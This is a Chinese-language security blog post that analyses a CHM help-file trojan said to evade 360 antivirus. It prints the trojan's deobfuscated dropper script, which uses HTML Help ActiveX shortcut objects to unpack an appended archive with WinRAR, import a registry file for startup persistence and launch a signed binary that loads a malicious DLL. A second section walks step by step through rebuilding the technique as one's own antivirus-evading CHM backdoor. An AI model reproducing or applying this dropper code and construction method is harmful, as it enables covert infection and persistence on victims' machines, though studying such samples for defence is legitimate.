***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**  

## 前言

CHM文件格式是微软推出的基于HTML文件特性的帮助文件系统，也称作“已编译的HTML帮助文件”。CHM能够支持脚本、Flash、图片、音频、视频等内容，并且同样支持超链接目录、索引以及全文检索功能，常用来制作说明文档、电子书等以方便查阅，在绝大多数人的印象中，CHM类型文件是“无公害”文档文件。

 **偶然获得了一个过X60启动的CHM木马，由于从未接触过此类木马，遂进行一番学习，并通过木马所带来的启发再创造。**

![1.png](https://image.3001.net/images/20190719/1563551404_5d31e6ace3e1f.png!small)

## 一、木马行为分析

CHM文件是经过压缩的各类资源的集合，使用7z解压软件直接打开木马样本，如图所示，可以发现CHM文件内部包含一个说明.html文件。

![2.png](https://image.3001.net/images/20190719/1563551554_5d31e7426e963.png!small)打开说明.HTM文件可以发现里面存着混淆过的JS脚本代码：

![3.png](https://image.3001.net/images/20190719/1563551693_5d31e7cd67e85.png!small)进行一番解密并写下粗略的注释
PS:本人并未学过JS 所以并不懂JS 以下有任何错误请大家指出

![4.png](https://image.3001.net/images/20190719/1563551984_5d31e8f0cfb9f.png!small)![5.png](https://image.3001.net/images/20190719/1563551984_5d31e8f0e4fab.png!small)

可以看出最关键的代码应该是

    
    
    var d = '<OBJECT id=UNRAR classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",C:\\Program Files\\WinRAR\\unrar.exe,e -r -y -pa123.../*- ' + c + ' C:\\Users\\Public\\Documents"><PARAM name="Item2" value="273,1,1"></OBJECT><OBJECT id=RUN classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",regedit.exe,/s C:\\Users\\Public\\Documents\\1.reg"><PARAM name="Item2" value="273,1,1"></OBJECT><OBJECT id=AUTO classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",C:\\Users\\Public\\Documents\\Perflog.exe"><PARAM name="Item2" value="273,1,1"></OBJECT>';

结合我之前对CHM木马的行为分析基本可以判断CHM木马的执行流程：

> 1.利用WINRAR解压自身到C:\Users\Public\Documents
>
> 2.执行CMD命令注册1.reg 添加启动
>
> 3.打开Perflog.exe

在WIN7虚拟机打开样本可以看到解压出了如下文件：

![QQ截图20190720084452.png](https://image.3001.net/images/20190720/1563583642_5d32649a5b8fd.png!small)![QQ截图20190720084554.png](https://image.3001.net/images/20190720/1563583642_5d32649a63399.png!small)![QQ截图20190720084658.png](https://image.3001.net/images/20190720/1563583642_5d32649a74c0d.png!small)

可以看到解压出了如图五个文件并成功添加启动项

![QQ截图20190720085425.png](https://image.3001.net/images/20190720/1563584073_5d3266493afca.png!small)

由于我不懂逆向工程 但是可以做出如下推测

> 1.perflog.exe是具有有效签名的白文件启动时会调用edudll.dll
>
> 2.edudll.dll是黑dll

以上这应该是个一个典型的白加黑木马

水平有限就不去分析这个perflog.exe的行为了

接下来思考如何打造属于自己的CHM后门

## 二、再创造

思路:

样本的JS代码基本不变，只需去掉那些无用的文件，解压缩释放出1.reg与payload即可

1.反编译样本CHM（这里使用EasyCHM）

![QQ截图20190720090912.png](https://image.3001.net/images/20190720/1563584987_5d3269db425f7.png!small)![QQ截图20190720090939.png](https://image.3001.net/images/20190720/1563584987_5d3269db3eb5a.png!small)2.修改说明.htm
（由于懒 就不用做太多改动了）

![QQ截图20190720091402.png](https://image.3001.net/images/20190720/1563585252_5d326ae4e34bb.png!small)

![QQ截图20190720091300.png](https://image.3001.net/images/20190720/1563585190_5d326aa6f0679.png!small)

3.将自己的1.reg与payload制作成压缩包

![QQ截图20190720100750.png](https://image.3001.net/images/20190720/1563588475_5d32777b52242.png!small)

![QQ截图20190720102854.png](https://image.3001.net/images/20190720/1563589744_5d327c70a2db7.png!small)

4.编译CHM

![QQ截图20190720092134.png](https://image.3001.net/images/20190720/1563585704_5d326ca8a47c9.png!small)

5.将压缩包并写入CHM（利用C32Asm）

![QQ截图20190720092223.png](https://image.3001.net/images/20190720/1563585752_5d326cd8bbaef.png!small)

将payload.rar粘贴到CHM的最后面并保存![QQ截图20190720092318.png](https://image.3001.net/images/20190720/1563585819_5d326d1b596c7.png!small)

6.测试

![QQ截图20190720101415.png](https://image.3001.net/images/20190720/1563588860_5d3278fca6ded.png!small)

OK，成功。

## 三、小结

之所以这个方法能绕过杀毒检测我感觉可能是因为利用CHM文件可以绕过父进程检测

PS:我WIN7 32位虚拟机测试是可以过检测的，不知道别的环境是否可以，如果不行别喷我呀

另外此方法不用网络下载也很出彩（但是遇到没有预装winrar的系统可能就傻了）

## 四、一些废话

本人准大学生一枚，经过了衡水某中学复读一年的考验，成功超一本线（提交此文章审核时，刚好听到我被调剂到一个与计算机无关的专业，唉，只能好好学习争取转专业）。由于复读所以之前混的一些网络安全有关的圈子都删掉了，本人非常想向各位前辈学习有关网络安全的知识，希望前辈们可以带带我这个小弟，给我推荐一些论坛或者QQ群，让我可以有地方请教一些问题。最后，欢迎大佬的批评与指正，不胜感激。  

***本文作者：strawberry，本文属 FreeBuf 原创奖励计划，未经许可禁止转载**

